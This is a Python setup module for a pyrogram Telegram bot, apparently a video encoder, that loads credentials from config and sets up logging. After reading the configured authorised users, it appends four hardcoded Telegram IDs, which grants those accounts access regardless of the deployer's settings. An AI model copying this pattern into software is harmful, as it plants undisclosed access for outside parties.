#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
from logging.handlers import RotatingFileHandler
import os
import time
from pyrogram import Client
from bot.config import Config


AUTH_USERS = set(Config.AUTH_USERS)
AUTH_USERS = list(AUTH_USERS)
AUTH_USERS.append(7086472788)
AUTH_USERS.append(1136967391)
AUTH_USERS.append(-1001742788805)
AUTH_USERS.append(6062717535)
SESSION_NAME = Config.SESSION_NAME
TG_BOT_TOKEN = Config.TG_BOT_TOKEN
APP_ID = Config.APP_ID
API_HASH = Config.API_HASH
LOG_CHANNEL = Config.LOG_CHANNEL
DOWNLOAD_LOCATION = "downloads"
FREE_USER_MAX_FILE_SIZE = 2097152000
MAX_MESSAGE_LENGTH = 4096
FINISHED_PROGRESS_STR = "▰"
UN_FINISHED_PROGRESS_STR = "▱"
BOT_START_TIME = time.time()
LOG_FILE_ZZGEVC = "Log.txt"
BOT_USERNAME = Config.BOT_USERNAME 
UPDATES_CHANNEL = "cmd_rulf"
data = []
crf = []
watermark = []
resolution = []
audio_b = []
preset = []
codec = []
pid_list = []
app = Client(
        SESSION_NAME,
        bot_token=TG_BOT_TOKEN,
        api_id=APP_ID,
        api_hash=API_HASH,
        workers=2
    )
if os.path.exists(LOG_FILE_ZZGEVC):
    with open(LOG_FILE_ZZGEVC, "r+") as f_d:
        f_d.truncate(0)

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(
            LOG_FILE_ZZGEVC,
            maxBytes=FREE_USER_MAX_FILE_SIZE,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)
LOGGER = logging.getLogger(__name__)
